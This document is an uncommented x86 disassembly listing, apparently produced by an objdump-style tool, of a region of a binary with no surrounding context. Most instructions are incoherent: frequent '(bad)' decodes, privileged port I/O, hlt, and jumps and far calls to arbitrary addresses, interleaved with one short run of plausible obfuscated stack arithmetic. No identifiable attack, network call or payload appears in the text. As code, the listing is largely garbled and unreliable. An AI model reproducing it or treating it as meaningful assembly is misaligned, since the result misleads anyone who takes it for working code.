  41f605:	sub    bl,cl
  41f607:	lea    edi,[edx+0x35f04fae]
  41f60d:	mov    WORD PTR [esi-0x59a31923],fs
  41f613:	aaa    
  41f614:	(bad)  
  41f615:	enter  0x753e,0x48
  41f619:	outs   dx,DWORD PTR ds:[esi]
  41f61a:	inc    eax
  41f61b:	mov    ecx,0x4338df4b
  41f620:	loope  0x41f632
  41f622:	dec    ebx
  41f623:	repnz pushf 
  41f625:	out    dx,al
  41f626:	bound  ebx,QWORD PTR [edx+0x3b]
  41f629:	xor    eax,DWORD PTR [esi+0x5b]
  41f62c:	das    
  41f62d:	xor    al,0x69
  41f62f:	lock cs jp 0x41f648
  41f633:	mov    ch,0x6e
  41f635:	sbb    esi,DWORD PTR [ebp-0x4]
  41f638:	into   
  41f639:	pushf  
  41f63a:	outs   dx,DWORD PTR ds:[esi]
  41f63b:	mov    ecx,DWORD PTR [ecx]
  41f63d:	push   edx
  41f63e:	in     eax,dx
  41f63f:	sbb    cl,BYTE PTR [edi-0x65846516]
  41f645:	js     0x41f5d7
  41f647:	push   esp
  41f648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f649:	pop    ss
  41f64a:	not    DWORD PTR [edx-0x14]
  41f64d:	jl     0x41f652
  41f64f:	(bad)  [esi+eiz*1-0x7c]
  41f653:	nop
  41f654:	jmp    0x41f638
  41f656:	loopne 0x41f669
  41f658:	icebp  
  41f659:	or     eax,0xc29de43f
  41f65e:	xor    edx,DWORD PTR [eax]
  41f660:	retf   0x6144
  41f663:	fisub  WORD PTR [ebp-0x57]
  41f666:	imul   esp,DWORD PTR [esi+0x57137c0b],0x550c711a
  41f670:	mov    ah,0xe2
  41f672:	adc    BYTE PTR [esi+0x20c2bf08],ah
  41f678:	pop    esp
  41f679:	adc    eax,0x4da60e0d
  41f67e:	push   0x6b
  41f680:	mov    eax,0xb0cecb5c
  41f685:	leave  
  41f686:	sub    dh,BYTE PTR [edx]
  41f688:	ss pop ecx
  41f68a:	pop    ds
  41f68b:	(bad)  
  41f68c:	ret    
  41f68d:	cmp    al,0x8e
  41f68f:	inc    esi
  41f690:	sbb    edx,ebp
  41f692:	inc    edi
  41f693:	xchg   edi,eax
  41f694:	add    DWORD PTR [ebx-0x71],edx
  41f697:	cmp    DWORD PTR [esp+eax*8],edx
  41f69a:	nop
  41f69b:	int    0xa
  41f69d:	jbe    0x41f628
  41f69f:	loop   0x41f621
  41f6a1:	dec    edx
  41f6a2:	adc    eax,0x17a0d516
  41f6a7:	ins    BYTE PTR es:[edi],dx
  41f6a8:	aas    
  41f6a9:	inc    ebp
  41f6aa:	add    al,0xc5
  41f6ac:	jge    0x41f72a
  41f6ae:	mov    edx,0x24ae05fb
  41f6b3:	retf   0x5e3a
  41f6b6:	inc    edx
  41f6b7:	out    dx,al
  41f6b8:	jnp    0x41f700
  41f6ba:	mov    BYTE PTR [ebp+0x57],dl
  41f6bd:	test   eax,0xf8ea4f3d
  41f6c2:	sahf   
  41f6c3:	ins    BYTE PTR es:[edi],dx
  41f6c4:	test   al,0xc0
  41f6c6:	fcom   DWORD PTR [eax+0x60]
  41f6c9:	imul   ecx,DWORD PTR [ecx],0x5cfaeb55
  41f6cf:	(bad)  
  41f6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d1:	add    al,BYTE PTR [ebp+0x6a670e6b]
  41f6d7:	xor    eax,0x5fe43e72
  41f6dc:	stc    
  41f6dd:	fild   QWORD PTR [edi+eiz*8]
  41f6e0:	cmp    al,0x1
  41f6e2:	in     al,dx
  41f6e3:	adc    eax,0x3cbb5fca
  41f6e8:	jl     0x41f67b
  41f6ea:	pop    es
  41f6eb:	iret   
  41f6ec:	sub    BYTE PTR [esi],dl
  41f6ee:	inc    BYTE PTR [ecx+0x6f0b5b5a]
  41f6f4:	test   BYTE PTR [ecx-0x19],0xbe
  41f6f8:	pop    ds
  41f6f9:	(bad)  
  41f6fa:	dec    edi
  41f6fb:	imul   ecx,esp,0xbb8b6278
  41f701:	(bad)  
  41f703:	mov    eax,0x23af3b35
  41f708:	pushf  
  41f709:	test   eax,0x80eb4ee
  41f70e:	arpl   WORD PTR [edi],dx
  41f710:	sar    BYTE PTR [ebp-0x31],1
  41f713:	mov    bl,0x6b
  41f715:	gs sar bh,0xb1
  41f719:	jmp    0x86edfc13
  41f71e:	push   edx
  41f71f:	jnp    0x41f792
  41f721:	scas   al,BYTE PTR es:[edi]
  41f722:	ins    BYTE PTR es:[edi],dx
  41f723:	mov    ds:0xdfcba6d6,al
  41f728:	ret    
  41f729:	cmp    ebx,DWORD PTR [ebp+0x11]
  41f72c:	mov    dl,0xe9
  41f72e:	mov    bh,0xad
  41f730:	or     eax,DWORD PTR [ecx+0x4f1dc16f]
  41f736:	aam    0xea
  41f738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f739:	lahf   
  41f73a:	out    0x68,al
  41f73c:	add    al,0xc
  41f73e:	je     0x41f72c
  41f740:	mov    ebx,0x7c3697e2
  41f745:	and    esi,esi
  41f747:	xchg   edi,eax
  41f748:	test   BYTE PTR ds:0xa5610809,bl
  41f74e:	inc    ecx
  41f74f:	aam    0xfc
  41f751:	cwde   
  41f752:	and    esi,DWORD PTR [edi-0x79]
  41f755:	fs sbb ecx,esp
  41f758:	mov    ebx,0xac21c3cb
  41f75d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f75e:	mov    eax,0x4a8ef78f
  41f763:	jl     0x41f71f
  41f765:	sbb    DWORD PTR [eax-0x1],edi
  41f768:	psubd  mm0,mm1
  41f76b:	or     DWORD PTR ds:0xde7d4126,edi
  41f771:	adc    ebx,0x8f796a92
  41f777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f778:	mov    edx,0x1c2c773e
  41f77d:	or     al,0x0
  41f77f:	les    esp,FWORD PTR [eax-0x5b]
  41f782:	sub    DWORD PTR es:[edx+0x66],ebp
  41f786:	or     BYTE PTR [edx-0x3ef829c3],bl
  41f78c:	xor    dl,BYTE PTR [ebx]
  41f78e:	outs   dx,BYTE PTR ds:[esi]
  41f78f:	mov    ds:0x41b90e09,eax
  41f794:	xor    eax,0xc5a6f4ce
  41f799:	and    eax,0x1198a256
  41f79e:	mov    edi,0x278a10a0
  41f7a3:	loope  0x41f794
  41f7a5:	stc    
  41f7a6:	pop    esi
  41f7a7:	in     al,0x90
  41f7a9:	lods   al,BYTE PTR ds:[esi]
  41f7aa:	sbb    edx,DWORD PTR [eax-0x46]
  41f7ad:	adc    DWORD PTR [esp+eax*2+0x52f50a04],esp
  41f7b4:	dec    edx
  41f7b5:	push   ss
  41f7b6:	lods   al,BYTE PTR ds:[esi]
  41f7b7:	push   ebp
  41f7b8:	adc    ebx,eax
  41f7ba:	pcmpgtb mm3,mm4
  41f7bd:	xor    dh,BYTE PTR [ebp+ecx*1-0x5a]
  41f7c1:	int    0x91
  41f7c3:	inc    edx
  41f7c4:	inc    esp
  41f7c5:	mov    eax,ds:0x11480e91
  41f7ca:	add    al,0x59
  41f7cc:	mov    BYTE PTR cs:[ebx],cl
  41f7cf:	push   edi
  41f7d0:	jnp    0x41f793
  41f7d2:	mov    WORD PTR [edx+edi*1+0x284510c9],fs
  41f7d9:	pop    ds
  41f7da:	jl     0x41f77f
  41f7dc:	and    eax,0x63e32a9c
  41f7e1:	xchg   ebx,eax
  41f7e2:	xor    al,0x6f
  41f7e4:	icebp  
  41f7e5:	out    0x18,eax
  41f7e7:	pop    edx
  41f7e8:	inc    edx
  41f7e9:	addr16 leave 
  41f7eb:	ja     0x41f833
  41f7ed:	(bad)  
  41f7ee:	and    bh,ch
  41f7f0:	mov    edx,0x2302f3a7
  41f7f5:	gs xor al,cl
  41f7f8:	adc    edx,ebx
  41f7fa:	cdq    
  41f7fb:	add    dl,al
  41f7fd:	cmp    edx,DWORD PTR [ebx]
  41f7ff:	fist   WORD PTR [ecx-0x49]
  41f802:	lock scas al,BYTE PTR es:[edi]
  41f804:	clc    
  41f805:	popf   
  41f806:	icebp  
  41f807:	iret   
  41f808:	jge    0x41f875
  41f80a:	mov    ebp,0xb39d71f0
  41f80f:	repz or eax,0x38fcda43
  41f815:	int    0x46
  41f817:	xchg   ebx,eax
  41f818:	or     al,0x9
  41f81a:	push   ss
  41f81b:	sahf   
  41f81c:	pusha  
  41f81d:	inc    esp
  41f81e:	or     DWORD PTR [esi+0x460f9221],eax
  41f824:	dec    ebx
  41f825:	add    BYTE PTR [ebx-0x16f772dd],dh
  41f82b:	in     al,0xf6
  41f82d:	nop
  41f82e:	lahf   
  41f82f:	mov    al,0x93
  41f831:	das    
  41f832:	cmp    BYTE PTR [esp+edi*8+0x12],al
  41f836:	iret   
  41f837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f838:	sbb    cl,0x2a
  41f83b:	popf   
  41f83c:	test   BYTE PTR [edi+0x60e6ec88],0xba
  41f843:	jb     0x41f8aa
  41f845:	push   cs
  41f846:	(bad)  
  41f847:	lahf   
  41f848:	stos   BYTE PTR es:[edi],al
  41f849:	push   esi
  41f84a:	iret   
  41f84b:	mov    ebp,0xb67c46b4
  41f850:	notrack call DWORD PTR [eax+ecx*4-0x77]
  41f855:	dec    ebx
  41f856:	lahf   
  41f857:	xchg   ebx,eax
  41f858:	test   DWORD PTR [eax],eax
  41f85a:	sub    DWORD PTR [eax],eax
  41f85c:	add    dh,0x66
  41f85f:	scas   al,BYTE PTR es:[edi]
  41f860:	cs mov ebx,0x104d59e8
  41f866:	ins    DWORD PTR es:[edi],dx
  41f867:	ss ins DWORD PTR es:[edi],dx
  41f869:	mov    DWORD PTR [eax+0x37],ebx
  41f86c:	xor    esp,DWORD PTR [edi]
  41f86e:	dec    ebx
  41f86f:	jae    0x41f8a7
  41f871:	ficomp DWORD PTR [edi]
  41f873:	mov    BYTE PTR ds:0x8e12ac54,ch
  41f879:	enter  0x87e9,0x4c
  41f87d:	hlt    
  41f87e:	push   ebp
  41f87f:	aam    0x1
  41f881:	iret   
  41f882:	nop
  41f883:	mov    WORD PTR ds:0x161ad709,ss
  41f889:	test   BYTE PTR [edx],ch
  41f88b:	jo     0x41f8e8
  41f88d:	clc    
  41f88e:	dec    ebp
  41f88f:	cmp    eax,0x211d7a
  41f894:	stos   BYTE PTR es:[edi],al
  41f895:	stos   BYTE PTR es:[edi],al
  41f896:	push   ss
  41f897:	(bad)  
  41f899:	call   0x1820752d
  41f89e:	dec    edx
  41f89f:	daa    
  41f8a0:	pusha  
  41f8a1:	xchg   esp,eax
  41f8a2:	fstp   QWORD PTR [edx-0x63]
  41f8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8a6:	pop    ss
  41f8a7:	fisubr WORD PTR [esi]
  41f8a9:	ds sub al,0x3d
  41f8ac:	sub    esp,DWORD PTR [edx+0x44358609]
  41f8b2:	push   ebp
  41f8b3:	jae    0x41f8f4
  41f8b5:	push   ss
  41f8b6:	pop    ds
  41f8b7:	scas   al,BYTE PTR es:[edi]
  41f8b8:	xlat   BYTE PTR ds:[ebx]
  41f8b9:	das    
  41f8ba:	(bad)  
  41f8bb:	pop    es
  41f8bc:	out    0xf2,eax
  41f8be:	pusha  
  41f8bf:	add    dl,BYTE PTR [ecx]
  41f8c1:	(bad)  
  41f8c2:	iret   
  41f8c3:	mov    edi,0xe760c48e
  41f8c8:	ja     0x41f8de
  41f8ca:	mov    dl,BYTE PTR [esi+0x22]
  41f8cd:	or     ebp,DWORD PTR [esp+edi*4]
  41f8d0:	jne    0x41f928
  41f8d2:	push   0x835bef78
  41f8d7:	mov    esp,0xbd603c8b
  41f8dc:	test   eax,0xd7949ad9
  41f8e1:	outs   dx,DWORD PTR ss:[esi]
  41f8e3:	xchg   esi,eax
  41f8e4:	repnz adc BYTE PTR [ebx+0x7b],ch
  41f8e8:	out    0xc5,al
  41f8ea:	mov    WORD PTR [edi],?
  41f8ec:	sub    BYTE PTR [ecx-0x6c],dh
  41f8ef:	mov    eax,0x7921648c
  41f8f4:	lea    esp,[eax-0x6c]
  41f8f7:	jmp    0x41f91d
  41f8f9:	jbe    0x41f934
  41f8fb:	outs   dx,BYTE PTR ds:[esi]
  41f8fc:	jp     0x41f971
  41f8fe:	shl    BYTE PTR [eax+ebx*1],0x7d
  41f902:	pop    esp
  41f903:	leave  
  41f904:	mov    edi,0xb8b41893
  41f909:	dec    ecx
  41f90a:	mov    al,BYTE PTR [edi+0x2a]
  41f90d:	pushf  
  41f90e:	fdiv   st(6),st
  41f910:	adc    BYTE PTR [edi+0x79],0xcb
  41f914:	shl    DWORD PTR [edx],1
  41f916:	sub    BYTE PTR [edx-0x1b],dh
  41f919:	stos   DWORD PTR es:[edi],eax
  41f91a:	pop    ss
  41f91b:	xchg   esi,eax
  41f91c:	in     eax,0x8a
  41f91e:	in     eax,dx
  41f91f:	push   ss
  41f920:	ficom  DWORD PTR [ecx+0xe]
  41f923:	in     al,dx
  41f924:	cwde   
  41f925:	es xor eax,0x7cf5679
  41f92b:	test   BYTE PTR ds:0xb0e5634d,dh
  41f931:	and    cl,bl
  41f933:	pop    esp
  41f934:	cmc    
  41f935:	fmul   DWORD PTR [ecx]
  41f937:	add    esp,DWORD PTR [ebx-0x1c835d6e]
  41f93d:	xor    edi,edi
  41f93f:	test   edi,ebx
  41f941:	mov    dl,0xce
  41f943:	int3   
  41f944:	jge    0x41f9b4
  41f946:	lods   eax,DWORD PTR ds:[esi]
  41f947:	sti    
  41f948:	lods   eax,DWORD PTR ds:[esi]
  41f949:	and    cl,0xd8
  41f94c:	or     ecx,DWORD PTR [esi]
  41f94e:	and    al,0xd4
  41f950:	std    
  41f951:	cmp    DWORD PTR [edi+0x5ea498e],ebx
  41f957:	push   0xffffffea
  41f959:	sbb    eax,0x47942840
  41f95e:	dec    esi
  41f95f:	das    
  41f960:	or     esp,DWORD PTR [esi+edi*4+0x3ab5d552]
  41f967:	push   0x62716e91
  41f96c:	fisub  DWORD PTR [esi-0x36]
  41f96f:	xor    BYTE PTR [ebx-0x2dc5364],0x10
  41f976:	hlt    
  41f977:	les    ecx,FWORD PTR [eax+0x7c]
  41f97a:	mov    ds:0x4484e31e,al
  41f97f:	mov    dl,0xcb
  41f981:	bound  ecx,QWORD PTR ds:0x852f966a
  41f987:	fcomp  DWORD PTR [eax+0x44]
  41f98a:	cmp    edx,eax
  41f98c:	push   ecx
  41f98d:	mov    esi,0xee0c9018
  41f992:	xchg   ecx,eax
  41f993:	lods   eax,DWORD PTR ds:[esi]
  41f994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f995:	pop    ecx
  41f996:	ins    DWORD PTR es:[edi],dx
  41f997:	(bad)  
  41f998:	mov    ebp,edx
  41f99a:	(bad)  
  41f99b:	popf   
  41f99c:	pop    ds
  41f99d:	lods   al,BYTE PTR ds:[esi]
  41f99e:	jae    0x41f9aa
  41f9a0:	mov    al,0xa
  41f9a2:	add    ah,BYTE PTR [edi+0xf6e568e]
  41f9a8:	cmc    
  41f9a9:	nop
  41f9aa:	jp     0x41f984
  41f9ac:	pop    esi
  41f9ad:	or     BYTE PTR [eax+edi*4+0x31b9331f],dl
  41f9b4:	ret    
  41f9b5:	imul   eax,DWORD PTR [ecx-0xff33793],0xffffffc7
  41f9bc:	and    bl,cl
  41f9be:	sub    BYTE PTR [edx+0x478213a1],cl
  41f9c4:	out    dx,al
  41f9c5:	iret   
  41f9c6:	punpckhwd mm3,QWORD PTR [eax-0x60]
  41f9ca:	mov    bl,0xde
  41f9cc:	pop    es
  41f9cd:	add    eax,0x87673780
  41f9d2:	mov    ah,BYTE PTR [ebx]
  41f9d4:	add    ebx,edx
  41f9d6:	scas   al,BYTE PTR es:[edi]
  41f9d7:	sub    eax,0x21b11d64
  41f9dc:	xchg   ecx,eax
  41f9dd:	add    eax,0x1ae039ec
  41f9e2:	and    DWORD PTR [eax],0xffffffa8
  41f9e5:	xchg   ebp,eax
  41f9e6:	fdivp  st(3),st
  41f9e8:	(bad)  
  41f9e9:	mov    ch,0x91
  41f9eb:	mov    ah,0x43
  41f9ed:	push   0xffffffb0
  41f9ef:	jbe    0x41f9d3
  41f9f1:	or     ebx,DWORD PTR [esi]
  41f9f3:	push   0x78e82931
  41f9f8:	lds    ecx,FWORD PTR [ebx+0x2d]
  41f9fb:	push   0x6643b773
  41fa00:	dec    esi
  41fa01:	jae    0x41fa40
  41fa03:	ret    
  41fa04:	pop    ds
  41fa05:	(bad)
  41fa08:	data16 setns dh
  41fa0c:	mov    edi,0x89f97d7b
  41fa11:	jno    0x41f9b7
  41fa13:	push   es
  41fa14:	sub    eax,0xcc0821f3
  41fa19:	mov    bl,dh
  41fa1b:	sub    edi,eax
  41fa1d:	add    al,cl
  41fa1f:	sub    BYTE PTR [ecx],bh
  41fa21:	test   ebp,ecx
  41fa23:	mov    al,0x59
  41fa25:	dec    esp
  41fa26:	pop    ebx
  41fa27:	sub    eax,0x473cbdea
  41fa2c:	xor    eax,0x8bd8e5cd
  41fa31:	mov    esp,0xc8983933
  41fa36:	inc    esp
  41fa37:	fsub   DWORD PTR [esp+0x12]
  41fa3b:	pop    esp
  41fa3c:	dec    ebx
  41fa3d:	pop    esi
  41fa3e:	cdq    
  41fa3f:	sbb    al,0x3e
  41fa41:	jp     0x41fa6c
  41fa43:	leave  
  41fa44:	pandn  mm1,QWORD PTR [ecx+0x3d960127]
  41fa4b:	add    al,0xd2
  41fa4d:	jne    0x41fa69
  41fa4f:	adc    ecx,esi
  41fa51:	loopne 0x41fa04
  41fa53:	aad    0x6
  41fa55:	jbe    0x41fa1e
  41fa57:	(bad)  
  41fa58:	or     DWORD PTR [eax+edx*8+0x7902af94],edi
  41fa5f:	dec    eax
  41fa60:	inc    ebp
  41fa61:	mov    dh,0x4c
  41fa63:	jl     0x41fa79
  41fa65:	or     ecx,0x493450f9
  41fa6b:	mov    esp,0xcc0575c5
  41fa70:	(bad)  
  41fa71:	dec    eax
  41fa72:	push   edx
  41fa73:	cmp    BYTE PTR [edi+0x65bafd4],0xb8
  41fa7a:	in     al,dx
  41fa7b:	test   eax,0x53faafe1
  41fa80:	ret    
  41fa81:	(bad)  
  41fa82:	pop    ecx
  41fa83:	and    BYTE PTR [esi-0x78],0x54
  41fa87:	xor    ecx,esp
  41fa89:	iret   
  41fa8a:	push   esp
  41fa8b:	hlt    
  41fa8c:	mov    ds:0x34165ec0,eax
  41fa91:	repz retf 0x6d00
  41fa95:	or     BYTE PTR [esi],al
  41fa97:	sbb    DWORD PTR ds:[edx-0x96562d5],eax
  41fa9e:	pop    ds
  41fa9f:	add    edi,ebx
  41faa1:	mov    DWORD PTR [ebp+0x49],esp
  41faa4:	pop    esi
  41faa5:	int    0x20
  41faa7:	(bad)  
  41faa8:	out    dx,eax
  41faa9:	inc    esp
  41faaa:	and    ebx,DWORD PTR [ecx-0x43]
  41faad:	sub    esp,eax
  41faaf:	pop    esi
  41fab0:	in     eax,0x8f
  41fab2:	das    
  41fab3:	or     DWORD PTR [edi+0x1c33ec9c],0xa9a0ebd7
  41fabd:	cmp    dh,BYTE PTR [ebp+eiz*4+0x2a2bdd94]
  41fac4:	mov    esi,0xe09daea6
  41fac9:	fist   WORD PTR [ecx]
  41facb:	adc    edx,edi
  41facd:	in     eax,dx
  41face:	cld    
  41facf:	popf   
  41fad0:	jle    0x41fb48
  41fad2:	mov    dh,0x2a
  41fad4:	add    eax,0xb3ba038a
  41fad9:	sbb    al,dh
  41fadb:	rcl    BYTE PTR [eax+ebx*2+0x75],1
  41fadf:	lds    eax,FWORD PTR [ecx]
  41fae1:	add    ecx,eax
  41fae3:	fld    QWORD PTR [eax+0x6e283cf5]
  41fae9:	xor    al,0x18
  41faeb:	mov    eax,0x52423954
  41faf0:	mov    eax,eax
  41faf2:	push   ds
  41faf3:	int3   
  41faf4:	add    eax,0xb744e663
  41faf9:	lods   eax,DWORD PTR ds:[esi]
  41fafa:	repz dec eax
  41fafc:	cwde   
  41fafd:	push   ebx
  41fafe:	imul   ecx,DWORD PTR ds:0x897167cd,0xffffff90
  41fb05:	aas    
  41fb06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb07:	xor    dl,cl
  41fb09:	adc    BYTE PTR [ebp-0x79],bl
  41fb0c:	in     al,0x42
  41fb0e:	loopne 0x41fa95
  41fb10:	sub    bh,BYTE PTR [edi+0x44]
  41fb13:	neg    DWORD PTR [ebx-0x60a5d28a]
  41fb19:	outs   dx,BYTE PTR ds:[esi]
  41fb1a:	xchg   DWORD PTR [esi],ebx
  41fb1c:	inc    ecx
  41fb1d:	mov    ch,0x62
  41fb1f:	cmp    DWORD PTR [ebp+0x68d0e7a5],eax
  41fb25:	pop    edx
  41fb26:	adc    al,0x4d
  41fb28:	out    dx,al
  41fb29:	mov    ebp,0x4393e91e
  41fb2e:	lds    esp,FWORD PTR [ecx+0x75]
  41fb31:	xor    al,0x53
  41fb33:	leave  
  41fb34:	pusha  
  41fb35:	adc    edx,DWORD PTR [eax-0x3b869627]
  41fb3b:	add    BYTE PTR [ebp-0x7b],dl
  41fb3e:	cwde   
  41fb3f:	retf   
  41fb40:	cli    
  41fb41:	(bad)  
  41fb42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb43:	mov    esi,0xb851a544
  41fb48:	call   0x62ee:0xf83d16c8
  41fb4f:	mov    eax,ds:0xb3492bfc
  41fb54:	cmp    DWORD PTR [eax+edx*2],edi
  41fb57:	sbb    DWORD PTR [edi-0x2d],esi
  41fb5a:	xor    eax,0xf7a98829
  41fb5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb60:	les    edx,FWORD PTR [edx]
  41fb62:	xchg   al,dh
  41fb64:	inc    ecx
  41fb65:	ret    
  41fb66:	or     ebp,edi
  41fb68:	xor    ecx,DWORD PTR [ecx+edi*4]
  41fb6b:	test   BYTE PTR [edi+0x56],dl
  41fb6e:	ror    DWORD PTR [edi-0x7e2a4f15],0x22
  41fb75:	nop
  41fb76:	iret   
  41fb77:	mov    cl,0xca
  41fb79:	sbb    BYTE PTR ds:0x1968dea3,ch
  41fb7f:	data16 mov bl,0x18
  41fb82:	lds    ecx,FWORD PTR [esi-0x18]
  41fb85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb86:	jno    0x41fb3f
  41fb88:	lock xchg edi,eax
  41fb8a:	pop    ss
  41fb8b:	adc    DWORD PTR [ebx],esp
  41fb8d:	dec    ebx
  41fb8e:	in     eax,dx
  41fb8f:	rol    BYTE PTR [edx+0x36],1
  41fb92:	pop    edx
  41fb93:	pusha  
  41fb94:	lahf   
  41fb95:	hlt    
  41fb96:	repz push ecx
  41fb98:	call   0x3850eee9
  41fb9d:	inc    edx
  41fb9e:	(bad)  
  41fb9f:	retf   
  41fba0:	cmp    BYTE PTR [ebx-0x5e8ae78],ch
  41fba6:	push   esi
  41fba7:	shl    dl,0x30
  41fbaa:	mov    ebp,DWORD PTR [esi+edx*8+0x71]
  41fbae:	mov    ds:0x8fb08508,al
  41fbb3:	xchg   BYTE PTR ds:0xb8543818,al
  41fbb9:	nop
  41fbba:	in     al,dx
  41fbbb:	pop    ebp
  41fbbc:	or     ah,cl
  41fbbe:	push   es
  41fbbf:	inc    edi
  41fbc0:	or     ecx,edx
  41fbc2:	mov    DWORD PTR [ebp-0x54],ecx
  41fbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbc8:	mov    edx,DWORD PTR [ebp-0x50]
  41fbcb:	add    ecx,0x242ebc9
  41fbd1:	xor    ecx,edx
  41fbd3:	mov    DWORD PTR [ebp-0x50],ecx
  41fbd6:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbd9:	mov    edx,DWORD PTR [ebp-0x4c]
  41fbdc:	add    ecx,edi
  41fbde:	and    ecx,edx
  41fbe0:	mov    DWORD PTR [ebp-0x4c],ecx
  41fbe3:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbe6:	mov    edx,DWORD PTR [ebp-0x48]
  41fbe9:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41fbf0:	mov    DWORD PTR [ebp-0x48],ecx
  41fbf3:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbf6:	mov    edx,0xfa5e1524
  41fbfb:	sub    edx,ecx
  41fbfd:	add    edx,DWORD PTR [ebp-0x44]
  41fc00:	mov    DWORD PTR [ebp-0x44],edx
  41fc03:	mov    ecx,DWORD PTR [ebp+0x8]
  41fc06:	xor    ecx,eax
  41fc08:	add    ecx,esi
  41fc0a:	jne    0x41b4d1
  41fc10:	jmp    0x422001
  41fc15:	jmp    0x421f74
  41fc1a:	fistp  QWORD PTR [ecx+edi*4-0x13]
  41fc1e:	call   0xd5d8:0xbe4a8faa
  41fc25:	fs jecxz 0x41fc35
  41fc28:	inc    ebx
  41fc29:	and    eax,0x837cb769
  41fc2e:	cmp    eax,0x283835e
  41fc33:	xor    esp,ecx
  41fc35:	mov    ebx,0xdc589754
  41fc3a:	xor    bl,dh
  41fc3c:	or     ah,ah
  41fc3e:	mov    edi,0x6fd2daff
  41fc43:	sub    al,BYTE PTR [eax+0x393952e7]
  41fc49:	xlat   BYTE PTR ds:[ebx]
  41fc4a:	cmc    
  41fc4b:	xchg   edx,eax
  41fc4c:	popf   
  41fc4d:	cli    
  41fc4e:	rcl    DWORD PTR [ecx+0x7c],1
  41fc51:	xchg   DWORD PTR [ebp+0x5b],esi
  41fc54:	sbb    DWORD PTR [eiz*2+0x116fd86d],0x11c69c08
  41fc5f:	push   ecx
  41fc60:	jp     0x41fc16
  41fc62:	push   0x21
  41fc64:	jmp    DWORD PTR [edi-0x36]
  41fc67:	ror    DWORD PTR [ebx],1
  41fc69:	pop    edi
  41fc6a:	in     eax,dx
  41fc6b:	pop    edi
  41fc6c:	(bad)  
  41fc6d:	fldcw  WORD PTR [eax+0x2e]
  41fc70:	xchg   esp,eax
  41fc71:	lahf   
  41fc72:	xchg   esi,eax
  41fc73:	je     0x41fcc2
  41fc75:	shl    BYTE PTR [ecx+0x2ed28dbd],0xfa
  41fc7c:	lods   eax,DWORD PTR cs:[esi]
  41fc7e:	mov    eax,0x1e27d2c1
  41fc83:	add    BYTE PTR [esi-0x75495417],dh
  41fc89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc8a:	push   ds
  41fc8b:	jmp    0x41fd0b
  41fc8d:	pop    ds
  41fc8e:	ss pop edx
  41fc90:	and    al,0xe6
  41fc92:	push   esi
  41fc93:	sub    al,0x6b
  41fc95:	test   DWORD PTR [esi-0x422a0603],0x8a6444e7
  41fc9f:	ror    DWORD PTR [edi-0x27],1
  41fca2:	xor    DWORD PTR [esi],esp
  41fca4:	lods   al,BYTE PTR ds:[esi]
  41fca5:	(bad)  
  41fca6:	sti    
  41fca7:	div    DWORD PTR [eax+edi*1]
  41fcaa:	jecxz  0x41fc54
  41fcac:	popa   
  41fcad:	sub    DWORD PTR [edi-0x42],eax
  41fcb0:	leave  
  41fcb1:	outs   dx,DWORD PTR ds:[esi]
  41fcb2:	stos   BYTE PTR es:[edi],al
  41fcb3:	pop    ebp
  41fcb4:	or     ebx,DWORD PTR [edx+ebx*1]
  41fcb7:	xchg   DWORD PTR [edi-0x1a],edi
  41fcba:	lock fbstp TBYTE PTR [ebp-0x662d5d04]
  41fcc1:	in     al,dx
  41fcc2:	ret    
  41fcc3:	lea    edx,[esi]
  41fcc5:	push   edi
  41fcc6:	add    eax,0xb948a679
  41fccb:	int    0x67
  41fccd:	mov    esp,0x8d19b544
  41fcd2:	push   edx
  41fcd3:	adc    cl,bh
  41fcd5:	jmp    0x5276:0x54a0137
  41fcdc:	stos   BYTE PTR es:[edi],al
  41fcdd:	sti    
  41fcde:	dec    ebx
  41fcdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fce0:	loopne 0x41fcfc
  41fce2:	sub    dh,dh
  41fce4:	mov    esp,0x307b61f5
  41fce9:	push   edx
  41fcea:	mov    al,0xb3
  41fcec:	inc    edx
  41fced:	in     eax,0x45
  41fcef:	sbb    BYTE PTR [edx+0x27],0x1f
  41fcf3:	inc    edx
  41fcf4:	jnp    0x41fcfa
  41fcf6:	sbb    al,0x7f
  41fcf8:	aas    
  41fcf9:	stc    
  41fcfa:	test   al,0xeb
  41fcfc:	push   ebp
  41fcfd:	cld    
  41fcfe:	sbb    eax,ebx
  41fd00:	icebp  
  41fd01:	pop    ebx
  41fd02:	aad    0x73
  41fd04:	jne    0x41fcd8
  41fd06:	shr    DWORD PTR [ebx+0x26083e1a],cl
  41fd0c:	push   es
  41fd0d:	xchg   ebx,eax
  41fd0e:	in     eax,dx
  41fd0f:	xor    DWORD PTR es:[ebx+0x3c0c8cfb],ebp
  41fd16:	inc    ebp
  41fd17:	sub    ebx,0x66
  41fd1a:	pop    ebx
  41fd1b:	mov    BYTE PTR [ebx+0x0],bh
  41fd1e:	dec    esi
  41fd1f:	pop    eax
  41fd20:	add    BYTE PTR [eax+0x1a02f98f],al
  41fd26:	sbb    edi,esi
  41fd28:	jo     0x41fd40
  41fd2a:	add    al,BYTE PTR [esp+edi*1]
  41fd2d:	aaa    
  41fd2e:	outs   dx,BYTE PTR ds:[esi]
  41fd2f:	jno    0x41fcb6
  41fd31:	in     al,0xcf
  41fd33:	in     al,dx
  41fd34:	jb     0x41fd09
  41fd36:	or     eax,0xc317419a
  41fd3b:	mov    esi,DWORD PTR [ebp*1+0xb570c8d]
  41fd42:	dec    ebp
  41fd43:	in     eax,0xf4
  41fd45:	inc    esi
  41fd46:	dec    eax
  41fd47:	dec    ebp
  41fd48:	mov    ds:0x42d6c7b7,al
